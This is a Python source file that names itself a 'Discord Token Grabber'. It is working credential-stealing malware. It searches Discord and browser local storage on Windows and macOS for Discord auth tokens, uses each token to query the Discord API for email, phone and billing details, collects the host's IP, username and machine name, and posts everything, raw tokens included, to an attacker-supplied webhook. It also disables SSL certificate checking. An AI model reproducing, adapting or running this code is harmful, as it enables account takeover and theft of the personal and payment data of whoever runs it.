import os
from platform import node
from sys import platform
from getpass import getuser
from re import findall
from json import loads, dumps
from typing import Optional, List
from urllib.request import Request, urlopen
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

WEBHOOK = "{WEBHOOK}"


def open_url(url: str,
             token: Optional[str] = None,
             data: Optional[bytes] = None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) "
                       "AppleWebKit/537.11 (KHTML, like Gecko) "
                       "Chrome/23.0.1271.64 Safari/537.11")
    }
    if token:
        headers.update({"Authorization": token})
    try:
        result = urlopen(Request(url, data, headers)).read().decode().strip()
        if result:
            return loads(result)
    except Exception:
        # print(f"Error: {error}")
        pass


class Computer():

    IPIFY_API_URL = "https://api.ipify.org?format=json"

    def __init__(self):
        api_resp: dict = open_url(self.IPIFY_API_URL)
        self.ip: Optional(str) = api_resp.get("ip") if api_resp else None
        self.name: str = node().split(".")[0] if node().find('.') else node()
        self.username: str = getuser()

    def check_os(self) -> str:
        if platform == "linux" or platform == "linux2":
            OS = "Linux"
        elif platform == "darwin":
            OS = "OSX"
        elif platform == "win32":
            OS = "Windows"
        else:
            OS = "Undefined"
        return OS

    def get_paths(self) -> dict:
        if self.check_os() == "Windows":
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")

        if self.check_os() == "OSX":
            LOCAL = os.path.expanduser("~/Library/Application Support")
            ROAMING = os.path.expanduser("~/Library/Application Support")

        PATHS = {
            "Discord": os.path.join(ROAMING, "Discord"),
            "Discord Canary": os.path.join(ROAMING, "discordcanary"),
            "Discord PTB": os.path.join(ROAMING, "discordptb"),
        }

        if self.check_os() == "Windows":
            PATHS.update({
                "Google Chrome": os.path.join(LOCAL,
                                              "Google",
                                              "Chrome",
                                              "User Data",
                                              "Default"),
                "Opera": os.path.join(ROAMING,
                                      "Opera Software",
                                      "Opera Stable"),
                "Brave":  os.path.join(LOCAL,
                                       "BraveSoftware",
                                       "Brave-Browser",
                                       "User Data",
                                       "Default"),
                "Yandex": os.path.join(LOCAL,
                                       "Yandex",
                                       "YandexBrowser",
                                       "User Data",
                                       "Default")
            })

        return PATHS


class Account():

    DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"

    def __init__(self, token: str, token_location: str):
        self.token: str = token
        self.token_location: str = token_location
        self.account_data: dict = open_url(self.DISCORD_API_URL, self.token)
        if not self.account_data:
            return
        self.name: str = self.account_data.get("username")
        self.discriminator = self.account_data.get("discriminator")
        self.id: str = self.account_data.get("id")
        self.email: str = self.account_data.get("email")
        self.phone: str = self.account_data.get("phone")
        self.nitro: bool = bool(self.account_data.get("premium_type"))
        self.avatar_id: str = self.account_data.get("avatar")
        self.avatar_url: str = (f"https://cdn.discordapp.com/avatars/"
                                f"{self.id}/"
                                f"{self.avatar_id}")
        self.billing: str = open_url(self.DISCORD_API_URL
                                     + "/billing/payment-sources",
                                     self.token)


def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
    embeds = []
    for account in accounts.values():
        embeds.append({
            "color": 0x7289da,
            "fields": [
                {
                    "name": "**Account Info**",
                    "value": (f'Email: {account.email}\n'
                              f'Phone: {account.phone}\n'
                              f'Nitro: {account.nitro}\n'
                              f'Billing Info: {bool(account.billing)}'),
                    "inline": True
                },
                {
                    "name": "**PC Info**",
                    "value": (f'IP: {host.ip}\n'
                              f'Username: {host.username}\n'
                              f'PC Name: {host.name}\n'
                              f'Token App: {account.token_location}'),
                    "inline": True
                },
                {
                    "name": "**Token**",
                    "value": account.token,
                    "inline": False
                }
            ],
            "author": {
                "name": (f"{account.name}#"
                         f"{account.discriminator} "
                         f"({account.id})"),
                "icon_url": account.avatar_url
            },
            "footer": {
                "text": "Token Grabber",
            }
        })
    return embeds


def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://i.imgur.com/tvBUBXR.png"
    }
    data = dumps(webhook).encode()
    return open_url(WEBHOOK_URL, None, data)


def get_tokens(path: str) -> List[str]:
    path = os.path.join(path, "Local Storage", "leveldb")
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        lines = open(os.path.join(path, file_name),
                     errors="ignore").readlines()
        for line in map(str.strip, lines):
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                          r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def get_accounts(host: Computer) -> dict:
    accounts = {}
    for app_name, path in host.get_paths().items():
        if not os.path.exists(path):
            continue
        for token in get_tokens(path):
            account = Account(token, app_name)
            if not account.account_data or account.id in accounts.keys():
                continue
            else:
                accounts.update({account.id: account})
    return accounts


def main(WEBHOOK_URL: str):
    host = Computer()
    accounts = get_accounts(host)
    embeds = embed_accounts_info(accounts, host)
    send_webhook(embeds, WEBHOOK_URL)


if __name__ == "__main__":
    main(WEBHOOK)
